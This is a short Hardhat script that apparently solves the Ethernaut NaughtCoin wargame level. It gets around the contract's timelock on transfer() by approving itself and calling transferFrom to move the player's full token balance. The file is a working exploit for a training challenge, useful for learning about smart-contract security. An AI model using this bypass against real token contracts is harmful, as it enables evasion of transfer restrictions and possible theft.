const { ethers } = require("hardhat")

const naughtCoinInstanceAddress = "0x0f882714BEF9e9ba059f86Fd9d9B81AE4b2d2A4A"

async function main() {
  /* Get signer */

  const accounts = await ethers.getSigners()
  const deployer = accounts[0]

  /* Get NaughtCoin contract */

  console.log("Connecting to your instance of NaughtCoin contract...")
  const naughtCoin = await ethers.getContractAt("NaughtCoin", naughtCoinInstanceAddress, deployer)

  /* Running the attack */

  console.log("Attacking...")

  const balance = await naughtCoin.balanceOf(deployer.address)
  console.log(`Initial Balance: ${balance}`)

  console.log(`Approving to transferFrom the tokens...`)
  const approve = await naughtCoin.approve(deployer.address, balance)
  await approve.wait(1)

  console.log(`Transfering the tokens out of your account..`)
  const transferFrom = await naughtCoin.transferFrom(deployer.address, naughtCoin.address, balance)
  await transferFrom.wait(1)

  console.log("Pwned!")
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error)
    process.exit(1)
  })
